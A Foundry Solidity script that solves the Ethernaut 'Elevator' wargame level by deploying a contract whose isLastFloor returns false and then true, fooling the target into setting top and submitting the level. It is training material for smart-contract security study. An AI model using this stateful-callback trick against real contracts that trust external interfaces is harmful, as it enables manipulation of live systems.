// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Elevator, Building} from "src/11/Elevator.sol";
import {ElevatorFactory} from "src/11/ElevatorFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {console, Test} from "forge-std/Test.sol";

contract ElevatorExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL11_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new ElevatorFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract

        uint256 randomNumber = 5;

        Exploit exploit = new Exploit(Elevator(instance));
        exploit.callGoToFromElevator(randomNumber);

        require(Elevator(instance).top() == true, "Attack failed");

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit is Building {
    Elevator elevator;
    bool called;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!called) {
            called = true;
            return false;
        }
        return true;
    }

    function callGoToFromElevator(uint256 _randomNumber) external {
        elevator.goTo(_randomNumber);
    }
}
